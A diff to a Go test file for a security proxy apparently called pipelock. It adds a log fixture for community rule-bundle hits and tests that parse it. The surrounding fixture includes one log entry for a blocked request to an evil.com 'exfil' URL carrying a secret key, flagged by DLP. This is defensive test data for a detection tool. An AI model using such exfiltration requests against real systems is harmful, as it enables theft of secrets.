@@ -32,6 +32,8 @@ const (
 	testEvCfgReload = "config_reload"
 )
 
+const testBundleRulesJSONL = `{"level":"warn","time":"2026-03-16T10:00:00Z","event":"response_scan","patterns":["community:inject-test"],"bundle_rules":[{"rule_id":"community:inject-test","bundle":"community","bundle_version":"2026.03.1"}]}`
+
 const fixtureJSONL = `{"level":"info","time":"2026-03-05T10:00:00Z","component":"pipelock","event":"startup","listen":":8888","mode":"balanced","version":"0.3.5","config_hash":"abc123","message":"pipelock started"}
 {"level":"info","time":"2026-03-05T10:00:01Z","component":"pipelock","event":"allowed","method":"GET","url":"https://api.example.com/data","client_ip":"10.0.0.1","request_id":"req-001","status_code":200,"size_bytes":1234,"message":"request allowed"}
 {"level":"warn","time":"2026-03-05T10:00:02Z","component":"pipelock","event":"blocked","method":"GET","url":"https://evil.com/exfil?key=secret","client_ip":"10.0.0.1","request_id":"req-002","scanner":"dlp","reason":"AWS key pattern matched","mitre_technique":"T1048","message":"request blocked"}
@@ -1444,5 +1446,44 @@ func makeTestReport() *Report {
 		Categories: []CategoryStats{},
 		Timeline:   []TimeBucket{},
 		Evidence:   []Event{},
+	}
+}
+
+// ---------- BundleRules deserialization tests ----------
+
+func TestEventDeserializeBundleRules(t *testing.T) {
+	t.Parallel()
+
+	var ev Event
+	if err := json.Unmarshal([]byte(testBundleRulesJSONL), &ev); err != nil {
+		t.Fatalf("unmarshal: %v", err)
+	}
+	if len(ev.BundleRules) != 1 {
+		t.Fatalf("expected 1 bundle rule hit, got %d", len(ev.BundleRules))
+	}
+	if ev.BundleRules[0].Bundle != "community" {
+		t.Errorf("bundle = %q, want %q", ev.BundleRules[0].Bundle, "community")
+	}
+	if ev.BundleRules[0].BundleVersion != "2026.03.1" {
+		t.Errorf("bundle_version = %q, want %q", ev.BundleRules[0].BundleVersion, "2026.03.1")
+	}
+	if ev.BundleRules[0].RuleID != "community:inject-test" {
+		t.Errorf("rule_id = %q, want %q", ev.BundleRules[0].RuleID, "community:inject-test")
+	}
+}
+
+func TestEventBundleRulesOmittedWhenEmpty(t *testing.T) {
+	t.Parallel()
+
+	ev := Event{
+		Event:    testEvRespScan,
+		Patterns: []string{"test"},
+	}
+	data, err := json.Marshal(ev)
+	if err != nil {
+		t.Fatalf("marshal: %v", err)
+	}
+	if strings.Contains(string(data), "bundle_rules") {
+		t.Error("bundle_rules should be omitted when empty")
 	}
 }
